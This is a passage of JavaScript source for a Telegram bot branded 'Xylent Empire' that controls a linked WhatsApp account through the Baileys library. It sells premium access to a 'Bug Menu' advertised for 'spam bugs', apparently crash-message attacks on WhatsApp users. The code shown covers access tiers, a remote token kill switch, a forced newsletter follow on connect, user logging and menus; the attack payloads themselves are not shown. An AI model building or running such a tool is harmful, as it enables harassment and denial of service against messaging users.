const { Telegraf, Markup, session } = require("telegraf"); 
const fs = require("fs");
const path = require("path");
const moment = require("moment-timezone");
const {
  // Fungsi Utama & Soket
  makeWASocket,
  makeMessagesSocket,
  WASocket,
  baileys,
  isBaileys,

  // Autentikasi & Penyimpanan Data
  useMultiFileAuthState,
  useSingleFileAuthState,
  makeInMemoryStore,
  makeCacheableSignalKeyStore,
  initInMemoryKeyStore,
  AuthenticationState,

  // Versi & Koneksi
  fetchLatestBaileysVersion,
  fetchLatestWaWebVersion,
  DisconnectReason,
  ReconnectMode,

  // Konten & Pembuatan Pesan
  generateWAMessage,
  generateWAMessageFromContent,
  generateForwardMessageContent,
  generateMessageID,
  patchMessageBeforeSending,
  encodeSignedDeviceIdentity,
  encodeWAMessage,
  encodeNewsletterMessage,
  prepareWAMessageMedia,
  downloadAndSaveMediaMessage,
  downloadContentFromMessage,

  // Struktur & Tipe Pesan (Proto)
  proto,
  WAProto,
  WAProto_1,
  WAMessageProto,
  MessageTypeProto,
  AnyMessageContent,
  WAMessageContent,
  WAMessage,
  MessageOptions,
  MiscMessageGenerationOptions,
  MessageRetryMap,

  // Tipe Spesifik Pesan
  interactiveMessage,
  InteractiveMessage,
  nativeFlowMessage,
  listMessage,
  templateMessage,
  extendedTextMessage,
  WALocationMessage,
  WAContactMessage,
  WAContactsArrayMessage,
  WAGroupInviteMessage,
  WATextMessage,
  Header,

  // Utilitas JID (Nomor WhatsApp)
  areJidsSameUser,
  jidDecode,
  jidEncode,
  mentionedJid,

  // Metadata Grup
  GroupMetadata,
  WAGroupMetadata,
  GroupSettingChange,
  emitGroupParticipantsUpdate,
  emitGroupUpdate,

  // Utilitas Media & Network
  MediaType,
  Mimetype,
  MimetypeMap,
  MediaPathMap,
  WAMediaUpload,
  MediaConnInfo,
  URL_REGEX,
  WAUrlInfo,
  ProxyAgent,

  // Status & Event Lainnya
  WAMessageStatus,
  WA_MESSAGE_STATUS_TYPE,
  WA_MESSAGE_STUB_TYPES,
  WA_DEFAULT_EPHEMERAL,
  ChatModification,
  Browser,
  Browsers,
  MessageType,
  Presence,
  WANode,
  WAMetric,
  WAFlag,
  WAContextInfo,
  BaileysError,

  // Fungsi Parser Tambahan
  getContentType,
  getAggregateVotesInPollMessage,
  getButtonType,
  getStream,
  processTime,

  // Variabel Custom / Typo dari script asal (Bisa dihapus jika error)
  targetDecode,
  mentionedtarget,
  relayWAMessage
} = require("@whiskeysockets/baileys");

const pino = require("pino");
const chalk = require("chalk");
const axios = require("axios");
const vm = require('vm');
const https = require('https');
const readline = require('readline');
const { BOT_TOKEN, OWNER_IDS } = require("./config.js");
const crypto = require("crypto");
const sessionPath = './session';
let bots = [];
const bot = new Telegraf(BOT_TOKEN);
const userBugSelection = new Map();
const attackConfig = new Map();
const multiBugSession = new Map();
const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
// === Path File ===
const premiumFile = "./Db/premiums.json";
const adminFile = "./Db/admins.json";
const dbPath = "./Db/ControlCommand.json";
const cooldownFile = './Db/cooldown.json'
// === Fungsi Load & Save JSON ===
const loadJSON = (filePath) => {
  try {
    const data = fs.readFileSync(filePath);
    return JSON.parse(data);
  } catch (err) {
    console.error(chalk.red(`Gagal memuat file ${filePath}:`), err);
    return [];
  }
};

const saveJSON = (filePath, data) => {
  fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
};

function loadDB() {
if (!fs.existsSync(dbPath)) return {}
return JSON.parse(fs.readFileSync(dbPath))
}

function saveDB(data) {
fs.writeFileSync(dbPath, JSON.stringify(data, null, 2))
}

if (!fs.existsSync(dbPath)) {
  fs.writeFileSync(dbPath, JSON.stringify({ commands: {} }, null, 2));
}
// === Load Semua Data Saat Startup ===
let adminUsers = loadJSON(adminFile);
let premiumUsers = loadJSON(premiumFile);


// === Middleware Role ===
const checkOwner = (ctx, next) => {
  const userId = ctx.from.id.toString(); 
  if (!OWNER_IDS.includes(userId)) {
    return ctx.reply("❗Mohon Maaf Fitur Ini Khusus Owner");
  }

  return next();
};

const checkAdmin = (ctx, next) => {
  if (!adminUsers.includes(ctx.from.id.toString())) {
    return ctx.reply("❗ Mohon Maaf Fitur Ini Khusus Admin.");
  }
  next();
};

const checkPremium = async (ctx, next) => {
  const userId = ctx.from.id.toString();
  const chatId = ctx.chat?.id.toString();

  const bisaAkses =
    premiumUsers.includes(userId) ||
    isGroupPremium(chatId) ||
    ctx.from.id.toString() === OWNER_ID;

  if (!bisaAkses) {
    await ctx.reply(
      '❌ Fitur ini khusus *Premium!*\n\n' +
      '💡 Hubungi owner untuk upgrade premium.',
      { parse_mode: 'Markdown' }
    );
    return;
  }

  return next();
};

const checkPremiumStatus = (ctx) => {
  const userId = ctx.from?.id.toString();
  const chatId = ctx.chat?.id.toString();

  return (
    premiumUsers.includes(userId) ||
    isGroupPremium(chatId) ||
    userId === OWNER_ID
  );
};

const loadCooldown = () => {
    try {
        const data = fs.readFileSync(cooldownFile)
        return JSON.parse(data).cooldown || 5
    } catch {
        return 5
    }
}

const saveCooldown = (seconds) => {
    fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: seconds }, null, 2))
}

let cooldown = loadCooldown()
const userCooldowns = new Map()

const checkCooldown = (ctx, next) => {
    const userId = ctx.from.id
    const now = Date.now()

    if (userCooldowns.has(userId)) {
        const lastUsed = userCooldowns.get(userId)
        const diff = (now - lastUsed) / 1000

        if (diff < cooldown) {
            const remaining = Math.ceil(cooldown - diff)
            ctx.reply(`⏳ ☇ Harap menunggu ${remaining} detik`)
            return
        }
    }

    userCooldowns.set(userId, now)
    next()
}
// === Fungsi Admin / Premium ===
const addadmin = (userId) => {
  if (!adminUsers.includes(userId)) {
    adminUsers.push(userId);
    saveJSON(adminFile, adminUsers);
  }
};

const removeAdmin = (userId) => {
  adminUsers = adminUsers.filter((id) => id !== userId);
  saveJSON(adminFile, adminUsers);
};

const addpremium = (userId) => {
  if (!premiumUsers.includes(userId)) {
    premiumUsers.push(userId);
    saveJSON(premiumFile, premiumUsers);
  }
};

const removePremium = (userId) => {
  premiumUsers = premiumUsers.filter((id) => id !== userId);
  saveJSON(premiumFile, premiumUsers);
};
bot.use(session());

let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = "";
const usePairingCode = true;
// Func Block/Unblock Command
const checkCommandEnabled = async (ctx, next) => {
  if (!ctx.message?.text) return next();

  const text = ctx.message.text.trim();

  if (!text.startsWith("/")) return next();

  // ambil command utama
  let cmd = text.split(" ")[0].toLowerCase();

  // hapus @botusername
  if (cmd.includes("@")) {
    cmd = cmd.split("@")[0];
  }

  const db = loadDB();
  const chatId = String(ctx.chat.id);

  // =========================
  // GLOBAL DISABLE COMMAND
  // =========================
  if (db.commands?.[cmd]?.disabled) {
    return ctx.reply(
      db.commands[cmd].reason ||
      "⛔ Command ini dimatikan."
    );
  }

  // =========================
  // BLOCK COMMAND CHAT
  // =========================
  const blocked =
    db.groupCmdBlock?.[chatId] || [];

  // normalize semua cmd
  const normalizedBlocked = blocked.map(c =>
    c.toLowerCase().split("@")[0]
  );

  if (normalizedBlocked.includes(cmd)) {
    return ctx.reply(
      "⛔ Command ini diblock di chat ini."
    );
  }

  return next();
};

// Fungsi untuk mendapatkan waktu uptime
const getUptime = () => {
  const uptimeSeconds = process.uptime();
  const hours = Math.floor(uptimeSeconds / 3600);
  const minutes = Math.floor((uptimeSeconds % 3600) / 60);
  const seconds = Math.floor(uptimeSeconds % 60);

  return `${hours}h ${minutes}m ${seconds}s`;
};

const question = (query) =>
  new Promise((resolve) => {
    const rl = require("readline").createInterface({
      input: process.stdin,
      output: process.stdout,
    });
    rl.question(query, (answer) => {
      rl.close();
      resolve(answer);
    });
  });

const GITHUB_TOKEN_LIST_URL =
  "https://raw.githubusercontent.com/sanzzz134/dbbsc/refs/heads/main/tokens.json";

bot.telegram.setMyCommands([
  { command: 'start', description: 'Developer Tercinta @Xyzenofficial' },
  { command: 'antipromo', description: 'Toggle anti promosi per group' },
  { command: 'privatemute', description: 'Toggle auto mute private chat' },
]).then(() => {
  console.log('Daftar perintah berhasil diperbarui!');
}).catch((error) => {
  console.error('Gagal memperbarui perintah:', error);
});

async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL, { timeout: 8000 });
    return response.data.tokens || [];
  } catch (err) {
    console.error(chalk.red("❌ Gagal Di Variabel Raw Github."), err.message || "");
    return [];
  }
}

async function validateToken() {
  const validTokens = await fetchValidTokens();
  if (!validTokens.includes(BOT_TOKEN)) {
    console.error(chalk.red("❌ Token Terdeteksi Penyusup keluar...!!"));
    process.exit(1);
  }
  startBot();
}

function startBot() {
  console.clear();
  console.log(chalk.cyan(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⢤⠠⡔⣰⢂⡲⣄⠢⢄⠠⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠌⠰⡇⢾⣬⣷⣽⣧⣿⣵⣾⠽⡎⡶⠡⠌⠄⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⠲⣢⢹⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠡⢘⣥⣻⢬⢻⣿⣿⣿⣿⣿⣿⣤⢿⣱⢷⢔⡀⠂⠄⠀⠀⠀⠀⠀⠀⠀⡈⡌⣰⣸⠘⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠡⢂⡔⣧⣮⡾⣺⣗⣯⡿⠿⠿⠿⠾⣯⡽⣻⣭⡫⡻⣭⡘⠄⡀⠀⠀⠀⠀⠀⠁⠤⠍⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠌⡐⢡⢊⢮⣾⣻⣪⡮⠊⠁⠀⠀⠀⠀⠀⠀⠈⢓⡷⡙⣮⡪⡻⡰⣀⠔⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡈⢀⠐⢂⣏⢻⣏⠓⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢋⡟⣿⣾⣿⣇⡟⣉⣿⡖⢳⣾⣰⣶⣀⣀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠐⡠⢐⡼⣮⢯⣝⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⣾⣽⣿⣿⣿⣿⣿⣾⣯⢿⣿⣷⡯⠛⠤⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣂⡡⢚⣯⣯⣿⣾⡧⠀⠆⠀⠀⠀⠀⠀⠀⢀⣀⣠⣠⣤⣾⣿⣿⣿⣿⣿⣿⣿⠿⡟⠟⠩⠁⠂⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣤⣧⣤⣤⣴⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢻⠟⢫⠙⠠⠁⠸⠄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠄⣠⣤⣿⣿⣧⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣏⡉⡿⡈⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢤⡚⡽⢿⢿⡿⣿⢿⡿⠿⠿⠿⠻⠯⠿⣿⣿⣯⣻⣿⠽⠟⠟⠛⠻⢛⡩⣵⡟⡢⣟⠏⠠⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠁⠀⠂⠐⠀⠂⠀⠁⠈⠀⠁⠀⠂⠘⠫⣓⡷⡇⣿⣯⣴⣬⣿⡗⣟⣾⡿⡡⢊⠐⢀⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⠳⡝⣷⢾⢧⡷⣿⣿⠿⠉⡈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠠⠀⠃⡜⢚⠓⠃⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

`));

console.log(chalk.greenBright(`
┌─────────────────────────────┐
│ ⚠️ inicialização em execução com sucesso  
├─────────────────────────────┤
│ DESENVOLVEDOR : Pinzy | Xyzen 
│ TELEGRAMA : @xyzenofficial
│ CHANAL : @XylentOfficial
└─────────────────────────────┘
`));
  console.log(chalk.blue(" 𝐗𝐲𝐥𝐞𝐧𝐭 Is Here...!"));
  console.log(chalk.magenta("🔐 Semua Terkunci."));
};

/*validateToken(); 
buat validate token kalo lu mau kasih db nya*/
validateToken(); 

async function checkExpired() {

    const EXPIRED = new Date("2050-05-15T07:25:00Z").getTime()

    try {

        // ambil waktu server dari header
        const res = await axios.get("https://google.com")
        const now = new Date(res.headers.date).getTime()

        const diff = EXPIRED - now

        if (diff <= 0) {
            console.log("❌ SCRIPT EXPIRED, MOHON UNTUK MENUNGGU UPDATE DARI @xyzenofficial")
            process.exit(0);
        }

        const hari = Math.floor(diff / 86400000)
        const jam = Math.floor((diff % 86400000) / 3600000)

        console.log(`✅ SCRIPT ONLINE | WAKTU TOLERANSI TERSISA | ${hari} HARI ${jam} JAM LAGI`)

    } catch {
        console.log("⚠️ Gagal cek waktu internet")
    }

}

checkExpired();
// WhatsApp Connection
const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });

const startSesi = async () => {
  const { state, saveCreds } = await useMultiFileAuthState('./session');
  const { version } = await fetchLatestBaileysVersion();

  const connectionOptions = {
    version,
    keepAliveIntervalMs: 30000,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    auth: state,
    browser: ['Mac OS', 'Safari', '10.15.7'] 
    };


  sock = makeWASocket(connectionOptions);
  sock.ev.on('creds.update', saveCreds);
  store.bind(sock.ev);

  sock.ev.on('connection.update', (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === 'open') {
      sock.newsletterFollow("0029Vb82CCx9sBI5CeFqNY2T@newsletter");
      isWhatsAppConnected = true;
      console.log(chalk.red.bold(`
╭─────────────────────────────╮
│ ${chalk.white('Berhasil Tersambung')}
╰─────────────────────────────╯`));
    }

    if (connection === 'close') {
      const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
      console.log(chalk.red.bold(`
╭─────────────────────────────╮
│ ${chalk.white('Whatsapp Terputus')}
╰─────────────────────────────╯`));

      if (shouldReconnect) {
        console.log(chalk.red.bold(`
╭─────────────────────────────╮
│ ${chalk.white('Menyambung kembali...')}
╰─────────────────────────────╯`));
        startSesi();
      }

      isWhatsAppConnected = false;
    }
  });
};

const checkWhatsAppConnection = (ctx, next) => {
if (!isWhatsAppConnected) {
ctx.reply(`
❌ WhatsApp Belum terhubung
`);
return;
}
next();
};

////=========PRIVATE CHAT GUARD + AUTO MUTE LOG========\\\\

// Config - isi sesuai kebutuhan
const OWNER_ID = '8768626313'; // ganti dengan ID owner
const LOG_GROUP_ID = '-1003973782800'; // ganti dengan ID group log

// Helper: format tanggal & waktu lengkap
function formatDateTime(date) {
  const hari = ['Minggu','Senin','Selasa','Rabu','Kamis','Jumat','Sabtu'];
  const bulan = ['Januari','Februari','Maret','April','Mei','Juni',
                 'Juli','Agustus','September','Oktober','November','Desember'];
  const d = new Date(date);
  const namaHari = hari[d.getDay()];
  const tanggal = d.getDate();
  const namaBulan = bulan[d.getMonth()];
  const tahun = d.getFullYear();
  const jam = String(d.getHours()).padStart(2, '0');
  const menit = String(d.getMinutes()).padStart(2, '0');
  const detik = String(d.getSeconds()).padStart(2, '0');
  return `${namaHari}, ${tanggal} ${namaBulan} ${tahun} — ${jam}:${menit}:${detik}`;
}

function getRealTime() {
  const now = new Date();
  const hari = ['Minggu','Senin','Selasa','Rabu','Kamis','Jumat','Sabtu'];
  const bulan = ['Januari','Februari','Maret','April','Mei','Juni',
                 'Juli','Agustus','September','Oktober','November','Desember'];
  const Hari = hari[now.getDay()];
  const tanggalnew = now.getDate();
  const Bulan = bulan[now.getMonth()];
  const tahunnew = now.getFullYear();
  return `${Hari}, ${tanggalnew} ${Bulan} ${tahunnew}`;
}

function Time() {
 const noww = new Date();
  const buulan = ['Januari','Februari','Maret','April','Mei','Juni',
                 'Juli','Agustus','September','Oktober','November','Desember'];
  const tngl = noww.getDate();
  const moon = buulan[noww.getMonth()];
  const hun = noww.getFullYear();
  return `${tngl} ${moon} ${hun}`;
}

function formatMemory() {
  const usedMB = process.memoryUsage().rss / 1024 / 1024;
  return `${usedMB.toFixed(0)} MB`;
}

// Middleware: deteksi private chat & auto mute
let autoMuteEnabled = true;

// Durasi mute dalam ms (2 menit)
const MUTE_DURATION_MS = 2 * 60 * 1000;

// Map menyimpan userId → timestamp kapan mute berakhir
const mutedUsers = new Map();

// ── Helper: format tanggal ──────────────────────────────────
function formatDateTime(date) {
  return date.toLocaleString('id-ID', {
    day: '2-digit', month: '2-digit', year: 'numeric',
    hour: '2-digit', minute: '2-digit', second: '2-digit',
    hour12: false
  });
}

// ── Command: /privatemute on|off  (OWNER ONLY) ─────────────
bot.command('privatemute', async (ctx) => {
  const userId = ctx.from.id.toString();

  // Hanya owner yang bisa pakai command ini
  if (userId !== OWNER_ID.toString()) {
    return ctx.reply('⛔ Kamu tidak memiliki izin untuk menggunakan command ini.');
  }

  const arg = (ctx.message.text.split(' ')[1] || '').toLowerCase();

  if (arg === 'on') {
    autoMuteEnabled = true;
    return ctx.reply(
      `✅ *Auto-Mute Private Chat* telah *diaktifkan!*\n` +
      `Setiap user yang DM bot akan otomatis di-mute 2 menit.`,
      { parse_mode: 'Markdown' }
    );
    } else if (arg === 'off') {
    autoMuteEnabled = false;
    mutedUsers.clear(); // <── Tambahkan ini agar semua daftar mute langsung dihapus bersih!
    return ctx.reply(
      `🔕 *Auto-Mute Private Chat* telah *dinonaktifkan!*\n` +
      `Semua user telah dibebaskan dan bebas DM bot.`,
      { parse_mode: 'Markdown' }
    );

  } else {
    const status = autoMuteEnabled ? '🟢 *ON*' : '🔴 *OFF*';
    return ctx.reply(
      `ℹ️ Status Auto-Mute Private Chat: ${status}\n\n` +
      `Gunakan:\n` +
      `• \`/privatemute on\` — aktifkan\n` +
      `• \`/privatemute off\` — nonaktifkan`,
      { parse_mode: 'Markdown' }
    );
  }
});

// ── Middleware: Deteksi private chat & auto mute ───────────
bot.use(async (ctx, next) => {
  // Hanya tangkap pesan di private chat
  if (ctx.chat?.type !== 'private') return next();

  // Jangan proses command /start & /privatemute
  const text = ctx.message?.text || '';
  if (text.startsWith('/start') || text.startsWith('/privatemute')) return next();

  const user = ctx.from;
  const userId = user.id.toString();
  const username = user.username ? `@${user.username}` : `#${userId}`;
  const fullName = `${user.first_name || ''}${user.last_name ? ' ' + user.last_name : ''}`.trim();

  // ── OWNER BYPASS: owner tidak pernah kena mute ──────────
  if (userId === OWNER_ID.toString()) {
    return next();
  }

  // 🔥 [PERBAIKAN] Cek fitur aktif/mati ditaruh di sini!
  // Jika fitur MATI, langsung loloskan tanpa cek status mute yang tersisa
  if (!autoMuteEnabled) {
    return next();
  }

  // ── Cek apakah user masih dalam status mute ─────────────
  if (mutedUsers.has(userId)) {
    const unmuteTime = mutedUsers.get(userId);
    if (Date.now() < unmuteTime) {
      const sisaMs = unmuteTime - Date.now();
      const sisaMenit = Math.floor(sisaMs / 60000);
      const sisaDetik = Math.floor((sisaMs % 60000) / 1000);
      await ctx.reply(
        `⚠️ Kamu masih dalam status *mute*.\n` +
        `⏳ Sisa waktu: *${sisaMenit} menit ${sisaDetik} detik*`,
        { parse_mode: 'Markdown' }
      );
      return; // stop
    } else {
      // Waktu mute sudah habis, hapus dari map
      mutedUsers.delete(userId);
    }
  }

  // ── User kirim pesan di private → langsung mute ─────────
  const muteStart = new Date();
  const muteEnd = new Date(Date.now() + MUTE_DURATION_MS);
  mutedUsers.set(userId, muteEnd.getTime());

  const logMessage =
    `\`\`\`javascript\n` +
    `┏━━━〔 ✞ 𝐗𝐘𝐋𝐄𝐍𝐓 𝐄𝐌𝐏𝐈𝐑𝐄 ✞ 〕━━━┓\n` +
    `   >> PRIVATE CHAT DETECTED — AUTO MUTE <<\n` +
    `┗━━━━━━━━━━━━━━━━━━━━━━━┛\n\n` +
    `╭───〔 𝐋𝐎𝐆 𝐈𝐍𝐅𝐎 〕───╮\n` +
    `│ ◈ USER     : ${username}\n` +
    `│ ◈ NAMA     : ${fullName}\n` +
    `│ ◈ USER ID  : ${userId}\n` +
    `│ ◈ MUTE    : 2 Menit\n` +
    `│ ◈ MULAI   : ${formatDateTime(muteStart)}\n` +
    `│ ◈ BEBAS   : ${formatDateTime(muteEnd)}\n` +
    `╰──────────────────────╯\n` +
    `\`\`\``;

  // Kirim log ke GROUP
  try {
    await ctx.telegram.sendPhoto(LOG_GROUP_ID, 'https://h.top4top.io/p_3804dkqk41.jpg', {
      caption: logMessage,
      parse_mode: 'Markdown'
    });
  } catch (e) {
    console.error('Gagal kirim log ke group:', e.message);
  }

  // Kirim log ke OWNER
  try {
    await ctx.telegram.sendPhoto(OWNER_ID, 'https://h.top4top.io/p_3804dkqk41.jpg', {
      caption: logMessage,
      parse_mode: 'Markdown'
    });
  } catch (e) {
    console.error('Gagal kirim log ke owner:', e.message);
  }

  // Balas ke user yang kena mute
  await ctx.replyWithPhoto('https://h.top4top.io/p_3804dkqk41.jpg', {
    caption:
      `🚫 Kamu telah di-*mute* selama *2 menit* karena mengirim pesan ke private bot.\n\n` +
      `⏰ *Mulai* : ${formatDateTime(muteStart)}\n` +
      `✅ *Bebas* : ${formatDateTime(muteEnd)}`,
    parse_mode: 'Markdown'
  });

  return; // stop
});

////=========MENU UTAMA========\\\\
// Handler utama saat user mengetik /start
// Database Foto
const randomImages = [
  "https://l.top4top.io/p_3803smv0s1.jpg", // Foto 1
  "https://f.top4top.io/p_3788vut3d1.jpg"  // Foto 2 (Ganti dengan URL kedua kedomu)
];

// Variabel global sementara untuk menyimpan foto pilihan user saat /start
let userSelectedImage = randomImages[0]; 

// ======================== LANGKAH AWAL /START ========================
bot.start(async (ctx) => {
  const photoKeyboard = [
    [
      { text: "Old", callback_data: "pick_img_0", style: 'danger' },
      { text: "New", callback_data: "pick_img_1", style: 'primary' }
    ]
  ];

  await ctx.reply("Silahkan pilih foto utama yang ingin Anda gunakan untuk visualisasi menu:", {
    reply_markup: {
      inline_keyboard: photoKeyboard,
    },
  });
});

// Proses setelah foto diklik -> Munculkan Pilihan Gaya Menu
bot.action("pick_img_0", async (ctx) => {
  await ctx.answerCbQuery();
  userSelectedImage = randomImages[0]; // Set foto 1
  triggerMenuSelection(ctx);
});

bot.action("pick_img_1", async (ctx) => {
  await ctx.answerCbQuery();
  userSelectedImage = randomImages[1] || randomImages[0]; // Set foto 2
  triggerMenuSelection(ctx);
});

// Fungsi pembantu menampilkan pilihan style menu utama
async function triggerMenuSelection(ctx) {
  const chooseKeyboard = [
    [
      { text: "☭ Menu 1 (Old Style)", callback_data: "trigger_start1", style: 'danger' },
      { text: "㋡ Menu 2 (New Style)", callback_data: "trigger_start2", style: 'primary' }
    ]
  ];
  await ctx.editMessageText("Silahkan pilih tampilan menu yang ingin Anda gunakan:", {
    reply_markup: { inline_keyboard: chooseKeyboard },
  });
}

// ======================== SCRIPT ASLI TANPA DIUBAH ========================

// Callback Query untuk memproses pilihan Menu 1 (bot.start asli)
bot.action("trigger_start1", async (ctx) => {
  await ctx.answerCbQuery(); // Menghapus loading status di Telegram
  
  const userId = ctx.from.id.toString();
  const isPremium = premiumUsers.includes(userId);
  const memoryStatus = formatMemory();
  const Name = ctx.from.username ? `@${ctx.from.username}` : userId;
  const waktuRunPanel = getUptime();
  const waktu = getRealTime();
  const waStatus = sock && sock.user ? "Terhubung" : "Tidak Terhubung";
   const isPrem = checkPremiumStatus(ctx); 
  const prem = isPrem ? 'Yes' : 'No';  
     
  const mainMenuMessage = `\`\`\`JavaScript
┏━━━〔❆ 𝐗𝐘𝐋𝐄𝐍𝐓 𝐄𝐌𝐏𝐈𝐑𝐄  ❆ 〕━━━┓
   ステムオンライン — アクセス許可済み
   >> 開発責任者 — @xyzenofficial ⨻<<
┗━━━━━━━━━━━━━━━━━━━━━━━━━┛

╭───〔 𝐒𝐘𝐒𝐓𝐄𝐌 𝐋𝐎𝐆 〕───────╮
│const dev = require("@xyzenofficial");
│const script : require("Xylent Empire");
│const name  : require("${Name}");
│const runtime  : require("${waktuRunPanel}");
│const date : require("${waktu}");
│const status : require("${waStatus}");
│const premium : require("${prem}");
╰──────────────────────╯
\`\`\``;

  const mainKeyboard = [
    [
          {
        text: "「 👤 」𝐎͢𝐖͡𝐍͜𝐄͢𝐑͡⃟🞇𝐌͜𝐄͢𝐍͡𝐔͜⃟🞇",
        callback_data: "owner_menu",
        style: 'success',
      },
      {
        text: "「 🚀 」 𝐀͢𝐔͡𝐓͜⃟🞇𝐎͢ 𝐔͡𝐏͜𝐃͢𝐀͡𝐓͜⃟🞇𝐄͢",
        callback_data: "all_menu",
        style: 'danger',
      },
      {
        text: "「 🍂 」 𝐁͢𝐮͡𝐠͜⃟🞇𝐌͢e͡𝐧͜𝐮⃟🞇",
        callback_data: "bug_menu",
        style: 'primary',
      }
    ],
    [
    {
        text: "「 🎊 」 𝐅͢𝐈͡𝐓͜𝐔͢𝐑͡𝐄͜⃟🞇𝐓͢𝐎͡𝐎͜𝐋͢𝐒͡⃟🞇𝐌͢𝐄͡𝐍͜𝐔⃟🞇",
        callback_data: "tools_menu",
        style: 'danger',
      }
      ],
      [
      {
        text: "「 🪷 」 𝐈͢𝐍͡𝐅͜𝐎͢𝐑͡𝐌͜𝐀͢𝐒͡𝐈͜⃟🞇𝐒͢𝐂͡𝐑͜𝐈͢𝐏͡𝐓͜⃟🞇",
        url: "https://t.me/XylentOfficial",
        style: 'danger',
      },
        ],
  ];

  await ctx.replyWithPhoto(userSelectedImage, { // Memakai foto yang dipilih dlu
    caption: mainMenuMessage,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: mainKeyboard,
    },
  });
});


// Callback Query untuk memproses pilihan Menu 2 (Menggunakan tag <pre>)
bot.action("trigger_start2", async (ctx) => {
  await ctx.answerCbQuery(); // Menghapus loading status di Telegram
  
  const userId = ctx.from.id.toString();
  const isPremium = premiumUsers.includes(userId);
  const memoryStatus = formatMemory();
  const Name = ctx.from.username ? `@${ctx.from.username}` : userId;
  const waktuRunPanel = getUptime();
  const bulan = Time();
  const waStatus = sock && sock.user ? "Terhubung" : "Tidak Terhubung";
  const isPrem = checkPremiumStatus(ctx); 
  const prem = isPrem ? 'Yes' : 'No';   
   
  const mainMenuMessage = `
<blockquote><b>𝐗𝐘𝐋𝐄𝐍𝐓 𝐄𝐌𝐏𝐈𝐑𝐄</b></blockquote>
☭ Developer: @xyzenofficial
☭ Version : 2.0 ⨻
☭ Platform: Telegram ッ
☭ type : Telegraf
☭ type script: Bebas spam bugs
<blockquote><b>INFORMATION</b></blockquote>
☭ ID: ${userId}
☭ Username: ${Name}
☭ Premium : ${prem}
<blockquote><b>STATUS</b></blockquote>
☭ Koneksi: ${waStatus}
☭ Month: ${bulan}
☭ Runtime: ${waktuRunPanel}
`;

  const mainKeyboard = [
    [
    {
        text: "XSETTING",
        callback_data: "owner_menu",
        style: 'success',
      },
      {
        text: "XBUGS",
        callback_data: "bug_menu2",
        style: 'primary',
      }
    ],
      [
      {
        text: "DEVELOPER",
        url: "https://t.me/xyzenofficial",
        style: 'danger',
      },
    ],
  ];

  await ctx.replyWithPhoto(userSelectedImage, { // Memakai foto yang dipilih dlu
    caption: mainMenuMessage,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: mainKeyboard,
    },
  });
});

// Handler untuk owner_menu
bot.action("owner_menu", async (ctx) => {
  const userId = ctx.from.id.toString();
  const isPremium = premiumUsers.includes(userId);
  const memoryStatus = formatMemory();
  const Name = ctx.from.username ? `@${ctx.from.username}` : userId;
  const waktuRunPanel = getUptime();
  const waStatus = sock && sock.user ? "🟢 Connect" : "🔴 No Connect";
      
  const mainMenuMessage = `\`\`\`
╭━───━⊱ ⊱⪩ 𝙾𝚆𝙽𝙴𝚁 𝙼𝙴𝙽𝚄 ⪨⊰
┃❏ /addsender 62xxx
┃❏ /delsesi
┃❏ /addpremgroup <add all member>
┃❏ /delpremgroup <delete acces all memb>
┃❏ /addpremgroupid <ɪᴅ>
┃❏ /delpremgroupid
┃❏ /cekpremgroup
┃❏ /listpremgroup
┃❏ /blockcmd  <Block command bug>
┃❏ /unblockcmd <Unblock command bug>
┃❏ /listblockcmd <list command>
┃❏ /addadmin <ɪᴅ>
┃❏ /deladmin <ɪᴅ>
┃❏ /addprem <ɪᴅ>
┃❏ /delprem <ɪᴅ>
┃❏ /cekprem <ᴄᴇᴋ>
┃❏ /setcd 
┃❏ /addpromo 
┃❏ /delpromo
┃❏ /antipromo on/off
┃❏ /listpromo 
